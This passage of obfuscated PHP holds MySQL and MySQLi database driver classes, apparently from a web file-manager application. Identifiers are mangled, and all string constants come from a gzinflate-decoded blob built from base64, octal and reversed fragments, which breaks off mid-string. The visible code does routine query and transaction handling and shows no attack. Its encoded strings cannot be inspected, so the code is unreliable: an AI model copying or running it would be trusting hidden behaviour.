!1; } } return !0; } private function getAll() { $ÏúŞá·» = array(); if ($this->numRows > 0) { while ($Œ”áÍ¥Æ = mysql_fetch_assoc($this->queryID)) { $ÏúŞá·»[] = $Œ”áÍ¥Æ; } mysql_data_seek($this->queryID, 0); } return $ÏúŞá·»; } public function getFields($ÃäÑœóñ) { $¶‡®Üğè =& $_SERVER[•€áå–Õ]; $È¥‰»ë† = $this->query($¶‡®Üğè[938] . $this->parseKey($ÃäÑœóñ)); $¹™¹¦¹Ò = array(); if ($È¥‰»ë†) { foreach ($È¥‰»ë† as $á³¬äôê => $›ƒƒ¨šÀ) { $¹™¹¦¹Ò[$›ƒƒ¨šÀ[$¶‡®Üğè[41]]] = array($¶‡®Üğè[42] => $›ƒƒ¨šÀ[$¶‡®Üğè[41]], $¶‡®Üğè[43] => $›ƒƒ¨šÀ[$¶‡®Üğè[44]], $¶‡®Üğè[45] => (bool) (strtoupper($›ƒƒ¨šÀ[$¶‡®Üğè[46]]) === $¶‡®Üğè[939]), $¶‡®Üğè[47] => $›ƒƒ¨šÀ[$¶‡®Üğè[48]], $¶‡®Üğè[49] => strtolower($›ƒƒ¨šÀ[$¶‡®Üğè[50]]) == $¶‡®Üğè[51], $¶‡®Üğè[52] => strtolower($›ƒƒ¨šÀ[$¶‡®Üğè[53]]) == $¶‡®Üğè[54]); } } return $¹™¹¦¹Ò; } public function getTables($¼Ÿ¿Í“Í = '') { $÷ö—…®Ü =& $_SERVER[•€áå–Õ]; if (!empty($¼Ÿ¿Í“Í)) { $‰ĞÍõà = $÷ö—…®Ü[940] . $¼Ÿ¿Í“Í . $÷ö—…®Ü[941]; } else { $‰ĞÍõà = $÷ö—…®Ü[942]; } $åµ¬„¹Ã = $this->query($‰ĞÍõà); $Ì…¢àÑ« = array(); foreach ($åµ¬„¹Ã as $ŸêŸ™©— => $­¡†±åÆ) { $Ì…¢àÑ«[$ŸêŸ™©—] = current($­¡†±åÆ); } return $Ì…¢àÑ«; } public function replace($âìºÁ®˜, $› µöú¨ = array()) { $‹„ÑÒì =& $_SERVER[•€áå–Õ]; foreach ($âìºÁ®˜ as $õò¿ ˆ => $Ÿ¶¢Øê) { $–ü†îŒ = $this->parseValue($Ÿ¶¢Øê); if (is_scalar($–ü†îŒ)) { $‹ì¯ú‹›[] = $–ü†îŒ; $ˆ£ĞÎŒå[] = $this->parseKey($õò¿ ˆ); } } $Ñ„·šì¼ = $‹„ÑÒì[943] . $this->parseTable($› µöú¨[$‹„ÑÒì[334]]) . $‹„ÑÒì[944] . implode($‹„ÑÒì[60], $ˆ£ĞÎŒå) . $‹„ÑÒì[945] . implode($‹„ÑÒì[60], $‹ì¯ú‹›) . $‹„ÑÒì[946]; return $this->execute($Ñ„·šì¼); } public function insertAll($ÈìªÕÚå, $ñ–ı˜¡â = array(), $¥óş…ë™ = false) { $¯éÖòîö =& $_SERVER[•€áå–Õ]; if (!is_array($ÈìªÕÚå[0])) { return !1; } $ì‡§Í‹ = array_keys($ÈìªÕÚå[0]); $óƒÔÜ¼¿ = array(); foreach ($ÈìªÕÚå as $™ ¯‚›ı) { $¥ÛíšŞ = array(); foreach ($™ ¯‚›ı as $âåµÊ÷ã => $ŞËÆ½£§) { $ŞËÆ½£§ = $this->parseValue($ŞËÆ½£§); if (is_scalar($ŞËÆ½£§)) { $¥ÛíšŞ[] = $ŞËÆ½£§; } } $óƒÔÜ¼¿[] = $¯éÖòîö[315] . implode($¯éÖòîö[60], $¥ÛíšŞ) . $¯éÖòîö[946]; } array_walk($ì‡§Í‹, array($this, $¯éÖòîö[947])); $€É§Öç = ($¥óş…ë™ ? $¯éÖòîö[948] : $¯éÖòîö[949]) . $¯éÖòîö[950] . $this->parseTable($ñ–ı˜¡â[$¯éÖòîö[334]]) . $¯éÖòîö[944] . implode($¯éÖòîö[60], $ì‡§Í‹) . $¯éÖòîö[951] . implode($¯éÖòîö[60], $óƒÔÜ¼¿); return $this->execute($€É§Öç); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $À÷°Ë¼ò =& $_SERVER[•€áå–Õ]; $this->error = mysql_errno() . $À÷°Ë¼ò[4] . mysql_error($this->_linkID); if ($À÷°Ë¼ò[22] != $this->queryStr) { $this->error .= LNG($À÷°Ë¼ò[58]) . $this->queryStr; } think_trace($this->error, $À÷°Ë¼ò[22], $À÷°Ë¼ò[59]); return $this->error; } public function escapeString($Ö¨ÅĞĞ…) { if ($this->_linkID) { return mysql_real_escape_string($Ö¨ÅĞĞ…, $this->_linkID); } else { return mysql_escape_string($Ö¨ÅĞĞ…); } } public function parseKey(&$Ó¼‚Ñæ¯, $ÏÜÒÆªÁ = true) { $¦†Üœ =& $_SERVER[•€áå–Õ]; if ($ÏÜÒÆªÁ) { $Ó¼‚Ñæ¯ = $this->parseKeyCheck($Ó¼‚Ñæ¯); } if ($Ó¼‚Ñæ¯ != $¦†Üœ[215] && !preg_match($¦†Üœ[952], $Ó¼‚Ñæ¯)) { $Ó¼‚Ñæ¯ = $¦†Üœ[440] . trim($Ó¼‚Ñæ¯, $¦†Üœ[440]) . $¦†Üœ[440]; } return $Ó¼‚Ñæ¯; } } class DbMysqli extends Db { public function __construct($äœÈí·Ú = '') { $ÉĞØ³” =& $_SERVER[•€áå–Õ]; if (!extension_loaded($ÉĞØ³”[953])) { think_exception(think_lang($ÉĞØ³”[24]) . $ÉĞØ³”[954]); } if (!empty($äœÈí·Ú)) { $this->config = $äœÈí·Ú; if (empty($this->config[$ÉĞØ³”[27]])) { $this->config[$ÉĞØ³”[27]] = $ÉĞØ³”[22]; } } } public function connect($¸Ê±ó¤‰ = '', $ñĞğÅÌÓ = 0) { $Ä½¿±™‹ =& $_SERVER[•€áå–Õ]; if (!isset($this->linkID[$ñĞğÅÌÓ])) { if (empty($¸Ê±ó¤‰)) { $¸Ê±ó¤‰ = $this->config; } $this->linkID[$ñĞğÅÌÓ] = new mysqli($¸Ê±ó¤‰[$Ä½¿±™‹[927]], $¸Ê±ó¤‰[$Ä½¿±™‹[929]], $¸Ê±ó¤‰[$Ä½¿±™‹[930]], $¸Ê±ó¤‰[$Ä½¿±™‹[31]], $¸Ê±ó¤‰[$Ä½¿±™‹[928]] ? intval($¸Ê±ó¤‰[$Ä½¿±™‹[928]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $æŠ˜¨ = $this->linkID[$ñĞğÅÌÓ]->server_version; $this->linkID[$ñĞğÅÌÓ]->query($Ä½¿±™‹[931] . think_config($Ä½¿±™‹[932]) . $Ä½¿±™‹[68]); if ($æŠ˜¨ > $Ä½¿±™‹[933]) { $this->linkID[$ñĞğÅÌÓ]->query($Ä½¿±™‹[934]); } $this->connected = !0; if (1 != think_config($Ä½¿±™‹[32])) { unset($this->config); } } return $this->linkID[$ñĞğÅÌÓ]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($ÒÌÊÆÛï) { $ÓòêØĞ =& $_SERVER[•€áå–Õ]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ÒÌÊÆÛï; if ($this->queryID) { $this->free(); } think_action_status($ÓòêØĞ[33], 1); think_status($ÓòêØĞ[34]); $this->queryID = $this->_linkID->query($ÒÌÊÆÛï); if ($this->_linkID->more_results()) { while (($Ìâ§¹³î = $this->_linkID->next_result()) != NULL) { $Ìâ§¹³î->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Šì–’¯Á) { $øÁ·„ =& $_SERVER[•€áå–Õ]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $Šì–’¯Á; if ($this->queryID) { $this->free(); } think_action_status($øÁ·„[35], 1); think_status($øÁ·„[34]); $ìøŸàŒŒ = $this->_linkID->query($Šì–’¯Á); $this->debug(); if (!1 === $ìøŸàŒŒ) { $this->error(); return !1; } else { $this->numRows = $this->_linkID->affected_rows; $this->lastInsID = $this->_linkID->insert_id; return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if ($this->transTimes == 0) { $this->_linkID->autocommit(!1); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $€Ö²©¦ = $this->_linkID->commit(); $this->_linkID->autocommit(!0); $this->transTimes = 0; if (!$€Ö²©¦) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $ÊÈº·ˆ‰ = $this->_linkID->rollback(); $this->transTimes = 0; if (!$ÊÈº·ˆ‰) { $this->error(); return !1; } } return !0; } private function getAll() { $ÛÈÈÏ’ı = array(); if ($this->numRows > 0) { for ($•„‡ïË“ = 0; $•„‡ïË“ < $this->numRows; $•„‡ïË“++) { $ÛÈÈÏ’ı[$•„‡ïË“] = $this->queryID->fetch_assoc(); } $this->queryID->data_seek(0); } return $ÛÈÈÏ’ı; } public function getFields($Ä‹–¯Ñ») { $âáğãá¹ =& $_SERVER[•€áå–Õ]; $³Â”³Ñ£ = $this->query($âáğãá¹[938] . $this->parseKey($Ä‹–¯Ñ»)); $Šù´ı±¸ = array(); if ($³Â”³Ñ£) { foreach ($³Â”³Ñ£ as $ÃÂ‡ªÔ => $š„ÊÁéä) { $Šù´ı±¸[$š„ÊÁéä[$âáğãá¹[41]]] = array($âáğãá¹[42] => $š„ÊÁéä[$âáğãá¹[41]], $âáğãá¹[43] => $š„ÊÁéä[$âáğãá¹[44]], $âáğãá¹[45] => (bool) ($š„ÊÁéä[$âáğãá¹[46]] === $âáğãá¹[22]), $âáğãá¹[47] => $š„ÊÁéä[$âáğãá¹[48]], $âáğãá¹[49] => strtolower($š„ÊÁéä[$âáğãá¹[50]]) == $âáğãá¹[51], $âáğãá¹[52] => strtolower($š„ÊÁéä[$âáğãá¹[53]]) == $âáğãá¹[54]); } } return $Šù´ı±¸; } public function getTables($—€ü¡ Š = '') { $æ°ôĞáå =& $_SERVER[•€áå–Õ]; $¶”Ì•Ó“ = !empty($—€ü¡ Š) ? $æ°ôĞáå[940] . $—€ü¡ Š . $æ°ôĞáå[941] : $æ°ôĞáå[942]; $ÃÓŒÕÈ– = $this->query($¶”Ì•Ó“); $ê€ˆî±Ì = array(); if ($ÃÓŒÕÈ–) { foreach ($ÃÓŒÕÈ– as $³©‡ ¨ß => $Ì‰‡ğõ×) { $ê€ˆî±Ì[$³©‡ ¨ß] = current($Ì‰‡ğõ×); } } return $ê€ˆî±Ì; } public function replace($‡îÎªì, $áèŸ¶“æ = array()) { $±é‹ú€š =& $_SERVER[•€áå–Õ]; foreach ($‡îÎªì as $Äã¾Ë‘ => $Â¯‘–) { $Ò¢äş©£ = $this->parseValue($Â¯‘–); if (is_scalar($Ò¢äş©£)) { $ÄÅÉô†[] = $Ò¢äş©£; $»Ş£äàÙ[] = $this->parseKey($Äã¾Ë‘); } } $´Ö¾Ìå» = $±é‹ú€š[943] . $this->parseTable($áèŸ¶“æ[$±é‹ú€š[334]]) . $±é‹ú€š[944] . implode($±é‹ú€š[60], $»Ş£äàÙ) . $±é‹ú€š[945] . implode($±é‹ú€š[60], $ÄÅÉô†) . $±é‹ú€š[946]; return $this->execute($´Ö¾Ìå»); } public function insertAll($´“ù‹†, $ıÉ«´Í› = array(), $ñüØÙ = false) { $Ë·®«Õ =& $_SERVER[•€áå–Õ]; if (!is_array($´“ù‹†[0])) { return !1; } $¦üùÒß = array_keys($´“ù‹†[0]); $­­º¨Î« = array(); foreach ($´“ù‹† as $şùÁ»µÒ) { $ŞßÏÙ©° = array(); foreach ($şùÁ»µÒ as $¼şĞº³ => $Üšç¸Ğƒ) { $Üšç¸Ğƒ = $this->parseValue($Üšç¸Ğƒ); if (is_scalar($Üšç¸Ğƒ)) { $ŞßÏÙ©°[] = $Üšç¸Ğƒ; } } $­­º¨Î«[] = $Ë·®«Õ[315] . implode($Ë·®«Õ[60], $ŞßÏÙ©°) . $Ë·®«Õ[946]; } array_walk($¦üùÒß, array($this, $Ë·®«Õ[947])); $æ¡ŸÌ“ë = $ñüØÙ ? $Ë·®«Õ[948] : $Ë·®«Õ[949]; $ãÀ¥‘Øü = $æ¡ŸÌ“ë . $Ë·®«Õ[950] . $this->parseTable($ıÉ«´Í›[$Ë·®«Õ[334]]) . $Ë·®«Õ[944] . implode($Ë·®«Õ[60], $¦üùÒß) . $Ë·®«Õ[951] . implode($Ë·®«Õ[60], $­­º¨Î«); return $this->execute($ãÀ¥‘Øü); } public function close() { if ($this->_linkID) { $this->_linkID->close(); } $this->_linkID = null; } public function error() { $Œ¦†€ğñ =& $_SERVER[•€áå–Õ]; $this->error = $this->_linkID->errno . $Œ¦†€ğñ[4] . $this->_linkID->error; if ($Œ¦†€ğñ[22] != $this->queryStr) { $this->error .= LNG($Œ¦†€ğñ[58]) . $this->queryStr; } think_trace($this->error, $Œ¦†€ğñ[22], $Œ¦†€ğñ[59]); return $this->error; } public function escapeString($†„ö²Õå) { if ($this->_linkID) { return $this->_linkID->real_escape_string($†„ö²Õå); } else { return addslashes($†„ö²Õå); } } public function parseKey(&$ ‘ùæá¥, $—Ö¤ËÜª = true) { $º†ËÄº =& $_SERVER[•€áå–Õ]; if ($—Ö¤ËÜª) { $ ‘ùæá¥ = $this->parseKeyCheck($ ‘ùæá¥); } if ($ ‘ùæá¥ != $º†ËÄº[215] && !preg_match($º†ËÄº[952], $ ‘ùæá¥)) { $ ‘ùæá¥ = $º†ËÄº[440] . trim($ ‘ùæá¥, $º†ËÄº[440]) . $º†ËÄº[440]; } return $ ‘ùæá¥; } } goto DöÙö¯Æ; fßğÀ¦íÒ‚: if (!function_exists('_kodDe')) { function _kodDe($str) { $str = base64_decode($str); $l = strlen($str); $result = ''; $offset = ord($str[0]) - 30; for ($i = 1; $i < $l; $i += 2) { if ($i + 1 < $l) { $result .= chr(ord($str[$i + 1]) + $offset); $result .= chr(ord($str[$i]) + $offset); } else { $result .= chr(ord($str[$i]) + $offset); } } return $result; } } define("\225\200\341\345\226\325", "\x90\x81\x94\xe0\x8b\x81"); $_SERVER[•€áå–Õ] = explode("\174\2\174\3\174\5", gzinflate(substr("\x1f\x8b\x8\x0\x0\x0\x0\x0\x0\x13\xc5\x7d\x9\x78\x1b\xd5\xd5\x28\x29\x4b\x9\x5b\xd9\x5a\xd6\xc2\x60\x92\xd8\x4e\xb4\xd8\xce\xee\xc4\x49\x64\x59\xb6\x95\xc8\x92\x23\xc9\x59\xb0\xcd\x64\x24"."\215\254\211\45\215\242\31\171\113\330\313\122\366\226\262\224\355\57\320\2\55\20\240\354\224\100\201\102\313\116\313\32\226\226\37\222\0\5\312\322\7\224\322\226\167\227\163\227\31"."\311\360\277\357\275\357\173\201\104\367\236\273\314\135\316\75\367\334\163\317\71\367\366\127\77\371\325\245\147\154\372\326\246\235\67\355\272\365\235\353\376\163\373\66\32\336\264\313\246"."\51\350\77\22\76\362\254\335\167\42\177\16\70\353\314\206\206\356\171\173\314\212\356\165\336\355\67\151\277\324\156\324\316\216\105\236\170\62\274\367\323\67\56\17\355\270\346\211\361".strrev('i«nêé\\<P$§.„ÆY0Ó¯#Yj [e†cè­¦ŠQı+l´Ì¢´w%ÜúzvS')."\263\150\353\105\126\105\173\40\21\16\252\275\201\144\67\215\153\245\222\337\312\14\133\176\255\234\316\31\43\172\304\110\371\123\106\321\237\321\154\315\207\2\64\327\36\364\147\16\375".base64_decode('Sef09LCqpcyyrWcoqFLMG8VhSDaLWWOIhlkFfvrTF4+U9YJpQ6t90HgYPfKvtSFvsA==')."\164\65\32\113\252\211\276\336\336\120\74\11\231\132\345\364\202\231\201\120\111\53\153\5\350\142\111\57\133\150\314\344\352\324\222\131\322\213\16\210\0\340\256\246\64\13\152\352\150".strrev('2`D%QÂº‡µvó-çNÙZØL1§^Š†êR97¶¹5ZØ‘½B;W')."\213\122\160\60\326\323\23\116\126\303\343\261\110\244\75\20\134\121\235\322\33\17\164\365\4\24\324\76\64\231\106\61\153\66\50\353\150\312\72\245\221\6\72\15\75\17\223\120\324".base64_decode('WHPs8RKEkjyEkKlYyedpJMpDGT2rVfIwWh1ypFQ2Chrr9Ap9nEMBcyq2aRTTNBIasw==')."\313\232\200\243\266\246\321\104\43\264\243\260\104\50\22\12\46\25\334\100\245\63\36\353\121\140\22\12\232\145\353\145\145\165\167\50\36\122\160\243\333\352\111\137\353\25\300\227\50"."\32\12\45\20\211\50\223\325\140\353\205\22\253\206\226\251\121\131\54\336\21\212\53\355\153\25\61\102\151\263\120\60\213\76\124\13\232\111\133\152\152\50\36\247\1\17\54\302\110".base64_decode('GE8aRGKdnYkQj0HnVkZQS2YDfjpimWzeVke0fIWhKSyReviBX9MC1N1gFI0KoClUYQ==')."\232\26\153\61\4\52\54\267\316\40\172\6\2\5\124\336\204\162\51\200\245\130\56\3\55\314\21\32\154\133\102\177\27\101\261\24\246\22\43\172\331\126\365\142\332\314\30\105\130"."\276\113\1\15\65\73\327\121\106\324\241\14\264\305\314\147\130\130\320\40\114\161\242\225\202\234\205\107\21\155\311\147\312\172\361\233\163\322\150\204\57\140\234\127\304\112\250\45\174"."\xed\x1b\xd9\x71\xb1\x2\x71\xbe\x5e\x9e\x6a\x99\x95\x72\x1a\xd1\xc2\x2c\x8c\x46\x33\x80\x75\xdb\x46\x9d\x63\x3\x62\xf6\x95\xf2\xa6\x96\x49\xe8\x65\xde\x35\xc3\xec\x44\x15\xc5\x2a\xb6\xc\xac\x90".base64_decode('bJ1mudCBaAV8H60To69GwjBbKRlpxPwN/Sd5/zPYvwz90wjEcADalNPzeVUf02EpFQ==')."\x32\x73\x2d\x36\x18\x7e\xb\xd3\x62\x4\xa1\xd1\x70\x4c\xcd\x69\x56\xae\x27\x33\x57\x25\xa5\x18\x8d\xcd\xe8\x63\xbe\x52\xae\x4\xeb\x9c\x2f\xed\x1\x7\xaa\xe3\xa1\x8b\x9a\x76\x48\xda\x4f\xf2\x66".base64_decode('WsvLXaThnG2XEnox08k3m4w5WiQjVdIZxe/wKBmlR1mrdLcarRYrWMjzEOsdh1kcaA==')."\x8f\xb1\xe9\xcc\x64\x1\x49\xd9\x46\x51\x7\x1f\x34\x2c\x42\xf3\xc4\x82\x45\x1b\x55\xde\x48\x6b\xb6\x61\x16\xfd\x66\xda\xd6\x6d\xaf\x65\x97\x75\xd\x6a\xc\xa4\xd3\xba\x65\x79\x83\x68\xaf\x2b\x9b"."\171\157\40\237\67\107\275\261\262\61\144\24\133\225\231\100\176\351\106\350\305\44\261\25\326\156\335\42\5\43\16\376\314\314\266\212\235\365\56\140\153\222\347\56\153\105\53\253\227"."\275\41\130\31\255\12\152\54\247\213\54\133\207\141\225\114\313\300\315\153\125\64\333\326\322\71\114\123\104\365\155\137\223\337\300\273\247\136\225\67\64\126\62\312\272\305\332\252\164"."\365\44\241\22\124\273\356\355\55\153\103\5\255\125\51\125\122\150\144\140\245\326\200\321\334\60\64\255\112\32\107\75\112\241\142\331\336\262\216\210\223\201\66\100\30\344\160\326\333"."\203\327\225\241\147\274\11\104\303\1\74\273\151\216\202\120\107\141\151\24\332\235\114\366\252\341\116\264\111\107\103\152\117\40\31\4\226\42\144\153\103\254\315\21\104\231\171\225\14".base64_decode('uMaL1hdGrijqqwD2mqN6GX24fbxVGTYzKXPMx5I6gblhmfF0l2xvXCsO4fFJjdu65Q==')."\46\125\355\150\113\367\145\351\142\366\245\364\254\131\206\336\130\43\103\316\271\210\350\305\41\73\307\352\116\204\342\253\102\161\65\21\353\114\256\16\304\201\3\50\42\104\32\143\255"."\301\137\317\173\343\172\6\315\116\332\146\345\264\22\36\130\226\7\257\37\374\161\226\212\327\24\113\213\204\273\360\330\165\170\55\224\311\53\347\142\165\107\214\202\201\273\147\363\24"."\62\330\210\75\350\202\6\371\111\237\333\6\254\231\15\3\231\131\215\136\364\357\314\306\376\201\16\337\314\301\245\176\103\224\361\67\373\232\225\226\246\171\112\57\342\127\14\55\257"."\100\247\253\162\64\51\261\25\316\141\21\10\137\64\213\372\327\14\16\336\360\44\312\340\32\126\12\214\207\126\366\205\22\111\265\47\224\354\216\165\300\327\103\1\10\105\114\272\262".base64_decode('WW/76c8gIMAg/VENq1PaeXCUUyjVTK1Hk9GjMzIMMx8uaEPSPqA6twkcw4k9AjkQlg==')."\xad\x36\x32\x7c\x1f\x41\xd1\x6e\xdd\x18\xca\xc1\x80\x19\xb8\xba\xb4\x99\x37\xcb\x5a\x1e\x53\x4f\xb6\x70\x74\x46\xd1\x86\xc\xa0\x68\xa5\x7c\x5\xe1\x8c\x1f\x7f\x21\x99\xab\x14\x52\x40\xf4\x11\xdb"."\210\230\162\301\225\131\343\210\165\51\260\315\15\355\220\166\270\303\261\205\101\314\257\342\171\36\360\225\212\103\215\323\240\56\265\145\156\23\6\0\212\102\27\21\173\132\321\253\307"."\300\227\66\321\242\350\321\206\365\126\334\51\40\61\213\10\224\105\44\332\263\10\157\27\155\356\65\205\347\51\357\53\240\112\110\235\101\223\157\160\364\230\262\310\271\135\50\172\271"."\154\226\217\202\34\44\254\220\75\7\317\33\124\156\363\35\334\102\313\207\205\163\46\337\361\321\51\203\206\132\375\320\357\351\55\235\154\77\364\47\146\243\377\305\346\227\61\13\32"."\xdb\x4a\xc8\x26\xa0\x67\xe8\x2e\x40\x41\x33\x1d\x29\xdd\xba\x26\xd8\x18\xbb\x6c\x9b\x18\x5a\x76\x64\x41\xf8\x94\x33\x1\xaf\xd1\xbc\x41\x93\x2a\xbc\x6d\xac\x95\x19\x3d\xaf\x33\x5c\xc8\xe9\x6c\x23"."\155\202\154\150\354\70\246\210\23\34\342\220\21\124\160\60\206\25\107\45\361\266\307\342\253\361\221\102\0\360\336\17\63\57\202\171\64\356\61\202\373\42\336\133\326\263\6\220\253"."\x22\x42\xcd\x1e\xad\x3c\xcc\x3a\x86\x4a\x8a\x55\x83\x23\xd2\x8a\xea\xec\x8b\x44\xd4\x60\x2c\x9a\x44\x27\x12\xa\x59\x1d\xf\x27\x43\x6c\x5\x7\x3a\xd4\x40\xb0\x97\xc6\x38\x4f\x42\x68\x70\xf5\x6"."\x4b\x21\x23\x2d\x30\xc9\xa8\x11\x7e\xc1\x9\xa0\x4d\xad\x64\x16\x2d\xdd\xb\x67\x53\xaf\x38\xaf\x54\x25\x65\xc4\x46\x9\x74\x56\x6c\xae\xae\xfd\x72\xcc\xab\x15\x26\xbc\x5\x44\x2\xbc\xbc\x79\x4e".strrev('	Õœ°r´'."\0".'BºE	IÛÒÅñMGˆ¡ŠX±½Gñ«CÁáÿ±&˜a;r”'."\r".'E6').base64_decode('tmlVUMayMaGJvixlDWE9KOQFr+vsjldMOapyjre7JxD0JroDLXPnUejaQmYg2W1YAw==')."\307\360\70\14\330\250\65\107\55\353\210\56\260\232\133\232\232\331\252\105\34\206\324\236\265\336\202\27\327\202\307\312\327\324\324\304\352\232\65\117\311\41\162\4\170\153\26\63\144".strrev(' ĞòX®Ñª*cøÒÕN¦¨ª=Îi“Æ«OÎ4é(Á¨ï-Ÿf3KCKf’£Ø>').strrev('ÃjÔÖVº½³UÄx-Œm­mGÅ“âµ”ë1LP2'."\n".'çl£B–¨RÃÆ…A”')."\127\33\326\124\267\201\202\54\143\250\210\172\311\66\243\144\167\70\272\102\355\211\165\204\42\152\70\212\366\336\144\65\274\257\267\43\300\226\250\14\157\217\61\21\17\100\373\320\356".strrev('Ï®[âĞ4O"İ‚'."\r".'BGH¡Ã;G†¼3¨xŞÕÚ:R¹ë$ÍDÉ„Ö‡³»	*»')."\130\176\147\176\25\261\21\11\56\347\120\107\260\314\206\141\241\352\20\55\250\354\320\254\12\52\201\70\112\35\6\34\272\213\45\105\244\47\52\103\322\12\143\162\370\151\252\300\266"."\201\202\6\304\121\143\254\140\3\375\151\124\2\11\305\56\251\234\340\247\306\171\220\164\203\305\321\36\6\337\127\200\245\251\152\201\212\363\264\113\174\147\155\100\40\153\163\206\306"."\x15\x47\xe4\x4d\xa4\xa1\x19\x8\x10\x91\x14\xc2\x4\x32\x23\xf0\x19\x3\x11\xcb\xb2\x1d\x60\xcd\xc9\xa\x71\x90\x1a\xeb\xd\xc5\x3\x58\x98\xa4\xae\x8e\xc7\xa2\x5d\x50\x60\x34\xa7\xb3\x6\x84\x61".base64_decode('+BvYCQNkSrbYc9DxQGPCBTHo6002lJvozwwgBegsCpSlyEY9hbdfxj6xQBaRPbZ1mg==').base64_decode('Ff61lGnmGSVGHDDfErhMar3FkGSMbSazOCkD1I2tCEVVhlk0JmEjBYTi8VgcBsQ2hw==').strrev('·8Ê#Ÿ±'."\n".'4eÌã@¢'."\r".'òÎ÷èjÎŒÇıçÀeÄu‹'."\0".'³}ùpØ4Ù1ÇF	CÆ&‚`™')."\112\231\227\306\7\203\6\153\151\143\353\200\177\300\337\260\264\265\77\340\235\320\274\23\115\336\205\336\101\304\357\65\316\2\300\340\306\26\317\234\343\160\6\224\161\351\321\203\350"."\xa7\x6d\x60\xe9\xf4\x1\xef\x8c\xe3\xd7\x2d\xeb\x1f\x18\xac\x6f\x9d\x75\xd4\x80\xef\xe8\x81\xd1\xc1\x99\x8d\x4b\xd9\x77\xd2\x95\x32\x62\x29\x19\xc5\x42\x4d\xcd\xcc\x6a\x40\x4d\x42\x7\x6\x9e\xa5"."\110\66\65\51\3\113\230\60\112\2\272\161\336\161\14\216\346\120\37\22\45\372\275\3\263\6\227\112\345\44\220\373\133\210\222\242\35\66\307\363\5\274\307\340\236\361\242\170\335"."\3\176\124\212\151\261\55\341\165\221\322\322\100\7\20\215\24\354\272\135\346\302\52\347\121\166\343\164\372\173\34\233\310\41\175\214\357\137\131\243\14\330\131\51\32\33\30\273\134"."\324\67\100\300\264\31\176\247\164\173\124\147\350\201\340\216\70\102\16\106\367\121\222\24\313\113\173\6\221\52\110\333\55\343\356\112\52\76\102\214\362\30\332\106\140\236\246\102\156"."\53\255\225\364\204\324\103\125\115\6\332\43\41\225\121\30\240\304\54\116\250\142\73\227\144\243\256\11\212\312\350\103\132\34\122\311\221\35\126\276\265\41\257\20\302\100\131\366\126"."\162\365\140\125\112\230\373\126\320\214\243\261\125\320\6\256\264\55\121\350\220\103\71\125\236\200\222\306\70\101\54\162\322\305\242\307\24\12\332\124\22\63\144\41\236\231\161\255\376"."\x86\x81\x81\x4a\xbf\x9e\x19\xec\x47\x88\xaf\x79\xb3\x83\x1b\x67\x1f\xd7\xc8\xce\xb1\xfe\x1\xf4\x87\x45\x2\x35\xc4\xcb\x2a\xa7\x86\x2a\xe2\xc0\x7c\xb8\x1d\x5c\x9e\xe8\x88\xf0\x64\x1a\x35\xcb\x9c"."\365\55\71\216\211\266\151\153\171\107\25\111\14\141\244\211\361\121\40\131\243\263\35\21\24\13\363\154\222\134\236\220\323\50\227\144\161\106\110\22\14\343\22\11\335\366\361\34\36".base64_decode('KVFFcccdSVsdI/ZFtJyC0lZH5ZsJcqh0CPMtHV/wdFbyeZufVfPGMHwB1grcLXhhNw==')."\230\125\253\150\247\131\146\142\241\231\320\214\272\231\265\62\206\213\105\63\223\222\121\115\154\262\135\1\304\316\44\225\6\46\7\127\302\121\245\75\26\213\204\2\121\5\357\347\260"."\xf\x21\x66\x21\x11\xea\xd\xa0\x4d\xc\xb\x98\x12\xc9\x10\x88\xe6\xc3\x1d\x5e\x56\xef\x1a\x2f\x3b\x21\xf3\x80\x1\xc3\x6e\x96\x28\xdf\xa8\xdb\x2a\x3a\x74\xe\xb3\xb9\x94\xcf\xd8\xf8\xf0\xe0\xc1".strrev('tÖ$’9Vğî!ëG”ÓäØüJ>†#=™ÈG™£ˆö8|Õ¨<-æ]\'')."\x9c\x46\xa7\x9a\xbc\x36\xee\xa1\xcd\x89\xe8\x23\x7a\xde\xc3\xe\xfc\x1e\xd6\x46\xf\x93\x77\x78\x88\x9c\xa2\x3\x9a\xd5\x87\x96\x13\x34\x8b\x4\x11\xd5\xcc\x79\x30\x2\x61\xfc\xf5\x8\xc9\xb7\x7"."\235\302\365\62\311\2\3\43\16\224\36\161\330\364\14\225\315\112\251\227\175\123\212\321\146\1\100\264\231\3\342\246\151\173\230\10\305\43\313\122\240\25\1\266\116\152\16\147\355".base64_decode('3pDxdzcC8AsnVY/SN0xW9Xw4xUgbaY0gpzqO7XKOPESKw7lPPOAitEosVNyBTg3uWA==').base64_decode('aLVymCNo0YmoQsgtrjcEr+sWE7gvPvBHk9pQQvqcrQ2xb2FihVInzUrDcT09nhZyhw==')."\xe\x49\x9a\xe1\x8c\x55\x50\xd\x9\x2d\xeb\xea\x96\x87\xac\xa3\x5a\x6b\xa0\xf6\x1c\x73\xbc\xe6\x53\xb2\xc7\xd4\xa9\x6c\x8c\x19\xb2\xf3\xf9\x75\xac\x91\x6f\x5e\x9d\xd0\x2f\x42\x2\x63\x25\xc1\x44"."\320\306\142\62\234\100\233\132\147\236\15\112\213\234\14\4\330\343\214\341\305\345\43\4\231\334\40\46\270\110\52\22\352\114\52\313\143\210\172\31\246\112\313\250\70\263\102\376\61".strrev('P1;±}ÒF-ÃÃÄj•E‡„lâhs©